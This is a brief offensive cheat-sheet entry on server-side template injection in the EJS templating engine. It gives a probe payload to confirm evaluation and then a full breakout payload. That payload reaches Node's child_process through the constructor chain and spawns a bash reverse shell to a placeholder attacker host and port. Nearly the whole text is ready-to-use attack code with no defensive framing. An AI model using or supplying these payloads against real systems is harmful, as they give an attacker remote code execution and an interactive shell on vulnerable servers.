# SSTI

EJS: confirm with `<%= guest %>` in any user-editable template preview, then break out to RCE via the constructor chain.

```bash
# confirm engine evaluates input
<%= guest %>

# EJS breakout -> process -> child_process spawn (reverse shell)
<%= this.constructor.constructor("return process")().mainModule.require("child_process").spawn("bash", ["-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]) %>
```

